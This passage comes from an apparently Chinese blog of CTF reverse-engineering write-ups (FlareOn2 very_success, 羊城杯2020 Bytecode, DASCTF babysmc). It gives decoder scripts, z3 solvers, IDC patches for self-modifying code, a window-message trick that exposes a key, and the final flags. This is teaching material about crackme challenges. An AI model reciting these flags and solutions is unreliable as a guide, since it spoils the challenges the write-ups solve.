class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">HWND h = <span class="built_in">FindWindowW</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Flag就在控件里&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(h) &#123;</span><br><span class="line">        <span class="built_in">SendMessage</span>(h, <span class="number">0x0464</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;no&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>成功获得key</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132215829.png" alt="image-20221214212707630"></p><p>py解密</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意DES加密的key是8的倍数位</span></span><br><span class="line">key = <span class="string">b&quot;&#123;I am a Des Key&#125;&quot;</span>[:<span class="number">8</span>]</span><br><span class="line">c = <span class="number">0x944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b</span></span><br><span class="line"></span><br><span class="line">x = DES.new(key, DES.MODE_ECB)</span><br><span class="line">ans = x.decrypt(long_to_bytes(c))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;thIs_Is_real_kEy_hahaaa\x00&#x27;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FlareOn2_very_success</title>
      <link href="/2022/12/09/FlareOn2-very-success/"/>
      <url>/2022/12/09/FlareOn2-very-success/</url>
      
        <content type="html"><![CDATA[        <h2 id="FlareOn2-very-success"   >          <a href="#FlareOn2-very-success" class="heading-link"><i class="fas fa-link"></i></a><a href="#FlareOn2-very-success" class="headerlink" title="[FlareOn2]very_success"></a>[FlareOn2]very_success</h2>      <p>32位ida</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213516.png" alt="image-20221209211232916"></p><p>很明显一个输入加判断</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213517.png" alt="image-20221209211304600"></p><p>简单的加密，唯一要注意的就是v11</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213518.png" alt="image-20221209211412807"></p><p>看汇编或者动调发现，因为这个popf的原因，使得cf标志位为1，adc是带进位加法，也就是说这个v11恒为1</p><p>至于a3则靠动调直接得出，只不过a3有部分数据有可能会被ida错误的识别成代码</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213519.png" alt="image-20221209211635110"></p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = [</span><br><span class="line">    <span class="number">0xa8</span>, <span class="number">0x9a</span>, <span class="number">0x90</span>, <span class="number">0xb3</span>, <span class="number">0xb6</span>, <span class="number">0xbc</span>, <span class="number">0xb4</span>, <span class="number">0xab</span>,</span><br><span class="line">    <span class="number">0x9d</span>, <span class="number">0xae</span>, <span class="number">0xf9</span>, <span class="number">0xb8</span>, <span class="number">0x9d</span>, <span class="number">0xb8</span>, <span class="number">0xaf</span>, <span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0xa5</span>, <span class="number">0xa5</span>, <span class="number">0xba</span>, <span class="number">0x9a</span>, <span class="number">0xbc</span>, <span class="number">0xb0</span>, <span class="number">0xa7</span>, <span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0x8a</span>, <span class="number">0xaa</span>, <span class="number">0xae</span>, <span class="number">0xaf</span>, <span class="number">0xba</span>, <span class="number">0xa4</span>, <span class="number">0xec</span>, <span class="number">0xaa</span>,</span><br><span class="line">    <span class="number">0xae</span>, <span class="number">0xeb</span>, <span class="number">0xad</span>, <span class="number">0xaa</span>, <span class="number">0xaf</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    x = <span class="number">1</span> &lt;&lt; (v4 &amp; <span class="number">3</span>)</span><br><span class="line">    y = (flag[i] - <span class="number">1</span> - x) ^ <span class="number">0xc7</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(y), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    v4 += flag[i]</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>flag{<span class="exturl"><a class="exturl__link"   href="mailto:&#x61;&#x5f;&#76;&#x69;&#x74;&#x74;&#x6c;&#x65;&#95;&#x62;&#x31;&#116;&#95;&#x68;&#x61;&#114;&#x64;&#101;&#114;&#95;&#x70;&#x6c;&#101;&#122;&#64;&#102;&#x6c;&#97;&#x72;&#x65;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;" >&#x61;&#x5f;&#76;&#x69;&#x74;&#x74;&#x6c;&#x65;&#95;&#x62;&#x31;&#116;&#95;&#x68;&#x61;&#114;&#x64;&#101;&#114;&#95;&#x70;&#x6c;&#101;&#122;&#64;&#102;&#x6c;&#97;&#x72;&#x65;&#45;&#111;&#x6e;&#x2e;&#99;&#x6f;&#109;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2020_Bytecode</title>
      <link href="/2022/12/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Bytecode/"/>
      <url>/2022/12/03/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Bytecode/</url>
      
        <content type="html"><![CDATA[        <h2 id="羊城杯-2020-Bytecode"   >          <a href="#羊城杯-2020-Bytecode" class="heading-link"><i class="fas fa-link"></i></a><a href="#羊城杯-2020-Bytecode" class="headerlink" title="[羊城杯 2020]Bytecode"></a>[羊城杯 2020]Bytecode</h2>      <p>发现是个py字节码文件，手撕</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132213527.png" alt="image-20221203000708464"></p><p>大概就长这样</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> past.builtins <span class="keyword">import</span> raw_input</span><br><span class="line"></span><br><span class="line">en = [<span class="number">3</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>,</span><br><span class="line">          <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>,</span><br><span class="line">          <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>,</span><br><span class="line">          <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;welcome to GWHT2020&quot;</span>)</span><br><span class="line"></span><br><span class="line">flag = raw_input(<span class="string">&#x27;please input your flag&#x27;</span>)</span><br><span class="line"><span class="built_in">str</span> = flag</span><br><span class="line">a = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a &gt;= <span class="number">38</span>:</span><br><span class="line">    <span class="keyword">if</span> ((((<span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">0</span>]) * <span class="number">2020</span> + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">1</span>])) + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">2</span>])) * <span class="number">2020</span> + <span class="built_in">ord</span>(<span class="built_in">str</span>[<span class="number">3</span>])) * <span class="number">2020</span>) + <span class="built_in">ord</span>(</span><br><span class="line">            <span class="built_in">str</span>[<span class="number">4</span>]) == <span class="number">1182843538814603</span>:</span><br><span class="line">        x = []</span><br><span class="line">        k = <span class="number">5</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">            b = <span class="built_in">ord</span>(<span class="built_in">str</span>[k])</span><br><span class="line">            c = <span class="built_in">ord</span>(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">            a11 = c ^ en[i % <span class="number">6</span>]</span><br><span class="line">            a22 = b ^ en[i % <span class="number">6</span>]</span><br><span class="line">            x.append(a11)</span><br><span class="line">            x.append(a22)</span><br><span class="line">            k += <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(output)):</span><br><span class="line">            <span class="keyword">if</span> output[i] != x[i]:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">        l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">        a1 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">7</span>])</span><br><span class="line">        a2 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">6</span>])</span><br><span class="line">        a3 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">5</span>])</span><br><span class="line">        a4 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">4</span>])</span><br><span class="line">        a5 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">3</span>])</span><br><span class="line">        a6 = <span class="built_in">ord</span>(<span class="built_in">str</span>[l - <span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((a1 * <span class="number">3</span> + a2 * <span class="number">2</span> + a3 * <span class="number">5</span>) == <span class="number">1003</span> <span class="keyword">and</span> (a1 * <span class="number">4</span> + a2 * <span class="number">7</span> + a3 * <span class="number">9</span>) == <span class="number">2013</span> <span class="keyword">and</span></span><br><span class="line">            (a1 * <span class="number">1</span> + a2 * <span class="number">8</span> + a3 * <span class="number">2</span>) == <span class="number">1109</span> <span class="keyword">and</span> (a4 * <span class="number">3</span> + a5 * <span class="number">2</span> + a6 * <span class="number">5</span>) == <span class="number">671</span> <span class="keyword">and</span></span><br><span class="line">            (a4 * <span class="number">4</span> + a5 * <span class="number">7</span> + a6 * <span class="number">9</span>) == <span class="number">1252</span> <span class="keyword">and</span> (a4 * <span class="number">1</span> + a5 * <span class="number">8</span> + a6 * <span class="number">2</span>) == <span class="number">644</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Congraduation!you get the right flag!&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br></pre></td></tr></table></div></figure><p>z3</p><p>写脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a1 = Int(<span class="string">&quot;a1&quot;</span>)</span><br><span class="line">a2 = Int(<span class="string">&quot;a2&quot;</span>)</span><br><span class="line">a3 = Int(<span class="string">&quot;a3&quot;</span>)</span><br><span class="line">a4 = Int(<span class="string">&quot;a4&quot;</span>)</span><br><span class="line">a5 = Int(<span class="string">&quot;a5&quot;</span>)</span><br><span class="line">a6 = Int(<span class="string">&quot;a6&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add((a1 * <span class="number">3</span> + a2 * <span class="number">2</span> + a3 * <span class="number">5</span>) == <span class="number">1003</span>)</span><br><span class="line">s.add((a1 * <span class="number">4</span> + a2 * <span class="number">7</span> + a3 * <span class="number">9</span>) == <span class="number">2013</span>)</span><br><span class="line">s.add((a1 * <span class="number">1</span> + a2 * <span class="number">8</span> + a3 * <span class="number">2</span>) == <span class="number">1109</span>)</span><br><span class="line">s.add((a4 * <span class="number">3</span> + a5 * <span class="number">2</span> + a6 * <span class="number">5</span>) == <span class="number">671</span>)</span><br><span class="line">s.add((a4 * <span class="number">4</span> + a5 * <span class="number">7</span> + a6 * <span class="number">9</span>) == <span class="number">1252</span>)</span><br><span class="line">s.add((a4 * <span class="number">1</span> + a5 * <span class="number">8</span> + a6 * <span class="number">2</span>) == <span class="number">644</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check():</span><br><span class="line">    result = s.model()</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a1 = 97, a2 = 101, a3 = 102</span></span><br><span class="line"></span><br><span class="line">en = [<span class="number">3</span>, <span class="number">37</span>, <span class="number">72</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">132</span>]</span><br><span class="line">output = [<span class="number">101</span>, <span class="number">96</span>, <span class="number">23</span>, <span class="number">68</span>, <span class="number">112</span>, <span class="number">42</span>, <span class="number">107</span>, <span class="number">62</span>,</span><br><span class="line">          <span class="number">96</span>, <span class="number">53</span>, <span class="number">176</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">53</span>, <span class="number">67</span>, <span class="number">29</span>,</span><br><span class="line">          <span class="number">41</span>, <span class="number">120</span>, <span class="number">60</span>, <span class="number">106</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">178</span>, <span class="number">189</span>,</span><br><span class="line">          <span class="number">101</span>, <span class="number">48</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag&#123;&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">26</span>, <span class="number">2</span>):</span><br><span class="line">    x = output[i] ^ en[(i//<span class="number">2</span>) % <span class="number">6</span>]</span><br><span class="line">    y = output[i+<span class="number">1</span>] ^ en[(i//<span class="number">2</span>) % <span class="number">6</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(y &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(x &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="number">97</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">102</span>)+<span class="built_in">chr</span>(<span class="number">55</span>)+<span class="built_in">chr</span>(<span class="number">51</span>), end=<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure><p>flag{cfa2b87b3f746a8f0ac5c5963faeff73}</p>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DAS2022 11</title>
      <link href="/2022/11/27/DAS202211/"/>
      <url>/2022/11/27/DAS202211/</url>
      
        <content type="html"><![CDATA[        <h1 id="DASCTF-NOV-X-2022-11月"   >          <a href="#DASCTF-NOV-X-2022-11月" class="heading-link"><i class="fas fa-link"></i></a><a href="#DASCTF-NOV-X-2022-11月" class="headerlink" title="DASCTF NOV X 2022 11月"></a>DASCTF NOV X 2022 11月</h1>              <h2 id="babysmc"   >          <a href="#babysmc" class="heading-link"><i class="fas fa-link"></i></a><a href="#babysmc" class="headerlink" title="babysmc"></a>babysmc</h2>      <p>32位无壳，ida打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211281.png" alt="image-20221127210009134"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211405.png" alt="image-20221127210446960"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211221.png" alt="image-20221127210510262"></p><p>34位输入，第一位和末位分别对两段进行smc</p><p>因为两个smc存在交叉，因此从地址较低的地方开始分析</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211361.png" alt="image-20221127210827376"></p><p>很明显这个某个函数的开头。</p><p>在32位的程序中，函数一般以push ebp 开头，对于的16进制是0x55，而这里是0x74，推导得到smc异或的值为<code>0x55 ^ 0x74 = 0x21</code>，用idc脚本进行解密</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static main()&#123;</span><br><span class="line">    auto addr = 0x004017C0;</span><br><span class="line">    auto n = 256;</span><br><span class="line">    auto i;</span><br><span class="line">    for(i = 0; i &lt; n; i++)&#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^0x21);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211496.png" alt="image-20221127211304645"></p><p>得到第一个函数</p><p>同理可得</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211878.png" alt="image-20221127211412288"></p><p><code>0x76 ^ 0x55 = 0x23</code></p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">static main()&#123;</span><br><span class="line">    auto addr = 0x00401850;</span><br><span class="line">    auto n = 256;</span><br><span class="line">    auto i;</span><br><span class="line">    for(i = 0; i &lt; n; i++)&#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^0x23);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211897.png" alt="image-20221127211610215"></p><p>第二个函数也有了</p><p>回到main函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132211406.png" alt="image-20221127212021344"></p><p>后两个是校验</p><p><img src="/DAS202211/202211272120162.png" alt="image-20221127212048122"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132212386.png" alt="image-20221127212100023"></p><p>用python跑z3，这个比较坑的点在于这两个是多解的</p><p>前半</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x[%d]&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">flag = [<span class="number">0x0002A81A</span>, <span class="number">0x00028D44</span>, <span class="number">0x00022653</span>, <span class="number">0x0002E993</span>, <span class="number">0x000249B5</span>, <span class="number">0x00024265</span>, <span class="number">0x0003253D</span>, <span class="number">0x0002D77B</span>,</span><br><span class="line">        <span class="number">0x000282C8</span>, <span class="number">0x00022892</span>, <span class="number">0x0002BD54</span>, <span class="number">0x0002482E</span>, <span class="number">0x00024C1F</span>, <span class="number">0x00028127</span>, <span class="number">0x0001E62E</span>, <span class="number">0x0001F009</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(flag[<span class="number">12</span>] == <span class="number">199</span> * x[<span class="number">9</span>] + <span class="number">98</span> * x[<span class="number">7</span>] + <span class="number">192</span> * x[<span class="number">8</span>] + <span class="number">23</span> * x[<span class="number">12</span>] + <span class="number">79</span> * x[<span class="number">14</span>] + <span class="number">77</span> * x[<span class="number">10</span>] + <span class="number">185</span> * x[<span class="number">13</span>] + <span class="number">135</span> * x[</span><br><span class="line">    <span class="number">15</span>] + <span class="number">119</span> * x[<span class="number">4</span>] + <span class="number">54</span> * x[<span class="number">0</span>] + <span class="number">41</span> * x[<span class="number">1</span>] + <span class="number">124</span> * x[<span class="number">6</span>] + <span class="number">18</span> * x[<span class="number">2</span>] + <span class="number">181</span> * x[<span class="number">11</span>] + <span class="number">191</span> * x[<span class="number">5</span>] + <span class="number">7</span> * x[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">s.add(</span><br><span class="line">    flag[<span class="number">3</span>] == <span class="number">210</span> * x[<span class="number">11</span>] + <span class="number">26</span> * x[<span class="number">15</span>] + <span class="number">169</span> * x[<span class="number">0</span>] + <span class="number">177</span> * x[<span class="number">13</span>] + x[<span class="number">6</span>] + <span class="number">205</span> * x[<span class="number">8</span>] + <span class="number">223</span> * x[<span class="number">10</span>] + <span class="number">32</span> * x[<span class="number">5</span>] + <span class="number">225</span> *</span><br><span class="line">    x[<span class="number">3</span>] + <span class="number">61</span> * x[<span class="number">14</span>] + <span class="number">72</span> * x[<span class="number">1</span>] + <span class="number">186</span> * x[<span class="number">9</span>] + <span class="number">253</span> * x[<span class="number">12</span>] + <span class="number">205</span> * x[<span class="number">2</span>] + <span class="number">49</span> * x[<span class="number">4</span>] + <span class="number">232</span> * x[<span class="number">7</span>])</span><br><span class="line">s.add(flag[<span class="number">13</span>] == <span class="number">192</span> * x[<span class="number">3</span>] + <span class="number">22</span> * x[<span class="number">10</span>] + <span class="number">175</span> * x[<span class="number">1</span>] + <span class="number">184</span> * x[<span class="number">7</span>] + <span class="number">116</span> * x[<span class="number">15</span>] + <span class="number">70</span> * x[<span class="number">13</span>] + <span class="number">153</span> * x[<span class="number">14</span>] + <span class="number">119</span> * x[</span><br><span class="line">    <span class="number">0</span>] + <span class="number">217</span> * x[<span class="number">6</span>] + <span class="number">123</span> * x[<span class="number">5</span>] + <span class="number">17</span> * x[<span class="number">2</span>] + <span class="number">244</span> * x[<span class="number">12</span>] + <span class="number">116</span> * x[<span class="number">8</span>] + <span class="number">46</span> * x[<span class="number">4</span>] + <span class="number">19</span> * x[<span class="number">9</span>] + <span class="number">130</span> * x[<span class="number">11</span>])</span><br><span class="line">s.add(flag[<span class="number">7</span>] == <span class="number">41</span> * x[<span class="number">12</span>] + <span class="number">71</span> * x[<span class="number">7</span>] + <span class="number">185</span> * x[<span class="number">1</span>] + <span class="number">69</span> * x[<span class="number">11</span>] + <span class="number">142</span> * x[<span class="number">8</span>] + <span class="number">221</span> * x[<span class="number">5</span>] + <span class="number">24</span> * x[<span class="number">3</span>] + <span class="number">208</span> * x[</span><br><span class="line">    <span class="number">6</span>] + <span class="number">41</span> * x[<span class="number">9</span>] + <span class="number">159</span> * x[<span class="number">2</span>] + <span class="number">231</span> * x[<span class="number">14</span>] + <span class="number">235</span> * x[<span class="number">13</span>] + <span class="number">225</span> * x[<span class="number">0</span>] + (x[<span class="number">4</span>] &lt;&lt; <span class="number">6</span>) + <span class="number">162</span> * x[<span class="number">10</span>] + <span class="number">134</span> * x[<span class="number">15</span>])</span><br><span class="line">s.add(flag[<span class="number">11</span>] == <span class="number">36</span> * x[<span class="number">12</span>] + <span class="number">220</span> * x[<span class="number">4</span>] + <span class="number">110</span> * x[<span class="number">13</span>] + <span class="number">45</span> * x[<span class="number">7</span>] + <span class="number">123</span> * x[<span class="number">9</span>] + <span class="number">133</span> * x[<span class="number">1</span>] + <span class="number">101</span> * x[<span class="number">5</span>] + <span class="number">137</span> * x[</span><br><span class="line">    <span class="number">10</span>] + <span class="number">102</span> * x[<span class="number">0</span>] + <span class="number">227</span> * x[<span class="number">14</span>] + <span class="number">94</span> * x[<span class="number">15</span>] + <span class="number">18</span> * x[<span class="number">2</span>] + <span class="number">22</span> * x[<span class="number">6</span>] + <span class="number">189</span> * x[<span class="number">11</span>] + <span class="number">218</span> * x[<span class="number">8</span>])</span><br><span class="line">s.add(</span><br><span class="line">    flag[<span class="number">15</span>] == <span class="number">86</span> * x[<span class="number">11</span>] + <span class="number">31</span> * x[<span class="number">9</span>] + <span class="number">229</span> * x[<span class="number">6</span>] + <span class="number">27</span> * x[<span class="number">3</span>] + <span class="number">6</span> * x[<span class="number">12</span>] + <span class="number">13</span> * x[<span class="number">10</span>] + <span class="number">158</span> * x[<span class="number">1</span>] + <span class="number">89</span> * x[<span class="number">7</span>] + <span class="number">35</span> *</span><br><span class="line">    x[<span class="number">15</span>] + <span class="number">126</span> * x[<span class="number">8</span>] + <span class="number">165</span> * x[<span class="number">13</span>] + <span class="number">220</span> * x[<span class="number">0</span>] + <span class="number">138</span> * x[<span class="number">5</span>] + <span class="number">100</span> * x[<span class="number">4</span>] + <span class="number">84</span> * x[<span class="number">14</span>] + <span class="number">175</span> * x[<span class="number">2</span>])</span><br><span class="line">s.add(flag[<span class="number">8</span>] == <span class="number">7</span> * x[<span class="number">1</span>] + <span class="number">28</span> * x[<span class="number">8</span>] + <span class="number">131</span> * x[<span class="number">10</span>] + <span class="number">6</span> * x[<span class="number">6</span>] + <span class="number">254</span> * 